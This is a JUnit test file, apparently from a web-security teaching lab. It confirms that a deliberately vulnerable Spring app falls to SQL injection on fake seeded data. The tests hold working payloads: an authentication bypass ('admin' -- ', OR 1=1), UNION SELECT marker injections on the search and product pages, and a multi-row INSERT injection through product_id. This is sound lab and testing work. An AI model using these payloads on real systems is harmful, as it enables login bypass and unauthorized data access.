package com.uth.websec;

import com.uth.websec.config.DbConfig;
import com.uth.websec.model.User;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.mock.web.MockHttpSession;
import org.springframework.test.context.TestPropertySource;
import org.springframework.test.web.servlet.MockMvc;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.Connection;
import java.sql.Statement;

import static org.assertj.core.api.Assertions.assertThat;
import static org.hamcrest.Matchers.containsString;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * SQLI-02 / SQLI-03 / SQLI-04 / VERIFY-01 (ANM-32, ANM-33, ANM-34, ANM-46):
 * Kiểm chứng kịch bản SQL Injection không phá hủy trên dữ liệu giả của app-vulnerable.
 */
@SpringBootTest
@AutoConfigureMockMvc
@TestPropertySource(properties = {
        "db.url=jdbc:h2:mem:vuln_sqli_baseline_db;MODE=MySQL;DB_CLOSE_DELAY=-1;DATABASE_TO_LOWER=TRUE",
        "db.user=sa",
        "db.pass="
})
class SqliBaselineLabTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private DbConfig dbConfig;

    @BeforeEach
    void resetSeedDatabase() throws Exception {
        Path initSqlPath = Path.of("../db/init.sql");
        if (!Files.exists(initSqlPath)) {
            initSqlPath = Path.of("lab-environment/db/init.sql");
        }
        String rawSql = Files.readString(initSqlPath, StandardCharsets.UTF_8);

        StringBuilder cleanedSql = new StringBuilder();
        for (String line : rawSql.split("\\R")) {
            String trimmed = line.trim();
            if (trimmed.isEmpty() || trimmed.startsWith("--")) {
                continue;
            }
            String upper = trimmed.toUpperCase();
            if (upper.startsWith("CREATE DATABASE") || upper.startsWith("USE ")) {
                continue;
            }
            cleanedSql.append(line).append("\n");
        }

        try (Connection conn = dbConfig.getConnection();
             Statement stmt = conn.createStatement()) {
            stmt.execute("DROP TABLE IF EXISTS comments");
            stmt.execute("DROP TABLE IF EXISTS products");
            stmt.execute("DROP TABLE IF EXISTS users");
            for (String statement : cleanedSql.toString().split(";")) {
                String sql = statement.trim();
                if (!sql.isEmpty()) {
                    stmt.execute(sql);
                }
            }
        }
    }

    @Test
    @DisplayName("SQLI-03/04 [Login]: Vượt xác thực admin bằng payload comment và OR 1=1 trên dữ liệu giả")
    void loginAuthBypassSucceedsOnVulnerableApp() throws Exception {
        MockHttpSession session1 = new MockHttpSession();
        mockMvc.perform(post("/login")
                        .param("username", "admin' -- ")
                        .param("password", "wrong_pass")
                        .session(session1))
                .andExpect(status().is3xxRedirection())
                .andExpect(redirectedUrl("/index.php"));

        User bypassedUser1 = (User) session1.getAttribute("user");
        assertThat(bypassedUser1).isNotNull();
        assertThat(bypassedUser1.getUsername()).isEqualTo("admin");
        assertThat(bypassedUser1.getRole()).isEqualTo("admin");

        MockHttpSession session2 = new MockHttpSession();
        mockMvc.perform(post("/login")
                        .param("username", "' OR 1=1 -- ")
                        .param("password", "anything")
                        .session(session2))
                .andExpect(status().is3xxRedirection())
                .andExpect(redirectedUrl("/index.php"));

        User bypassedUser2 = (User) session2.getAttribute("user");
        assertThat(bypassedUser2).isNotNull();
        assertThat(bypassedUser2.getUsername()).isEqualTo("admin");
    }

    @Test
    @DisplayName("SQLI-03/04 [Search]: UNION SELECT với marker giả làm thay đổi kết quả tìm kiếm")
    void searchUnionMarkerSucceedsOnVulnerableApp() throws Exception {
        String payload = "%' UNION SELECT 999, 'SQLI_SEARCH_MARKER', 'Du lieu gia danh dau', '12345' -- ";
        mockMvc.perform(get("/search").param("keyword", payload))
                .andExpect(status().isOk())
                .andExpect(view().name("search"))
                .andExpect(content().string(containsString("<h4>SQLI_SEARCH_MARKER</h4>")))
                .andExpect(content().string(containsString("Du lieu gia danh dau")));
    }

    @Test
    @DisplayName("SQLI-03/04 [Product Detail]: UNION SELECT qua tham số id trả về bản ghi đánh dấu giả")
    void productDetailUnionMarkerSucceedsOnVulnerableApp() throws Exception {
        String payload = "-1 UNION SELECT 999, 'SQLI_DETAIL_MARKER', 'Mo ta gia', 88888, 'Lab' -- ";
        mockMvc.perform(get("/product").param("id", payload))
                .andExpect(status().isOk())
                .andExpect(view().name("product"))
                .andExpect(content().string(containsString("<h2>SQLI_DETAIL_MARKER</h2>")));
    }

    @Test
    @DisplayName("SQLI-03/04 [Add Comment]: Tiêm đa dòng qua product_id chèn thêm bản ghi bình luận ngoài ý muốn")
    void commentInsertProductIdInjectionSucceedsOnVulnerableApp() throws Exception {
        String injectedProductId = "1, 'SQLI_INJECTED_AUTHOR', 'SQLI_INSERT_MARKER'), (1";
        mockMvc.perform(post("/product")
                        .param("product_id", injectedProductId)
                        .param("author", "NormalAuthor")
                        .param("content", "NormalContent"))
                .andExpect(status().is3xxRedirection())
                .andExpect(flash().attribute("commentSuccess", "Gửi bình luận đánh giá thành công!"));

        mockMvc.perform(get("/product").param("id", "1"))
                .andExpect(status().isOk())
                .andExpect(content().string(containsString("SQLI_INJECTED_AUTHOR")))
                .andExpect(content().string(containsString("SQLI_INSERT_MARKER")))
                .andExpect(content().string(containsString("NormalContent")));
    }
}
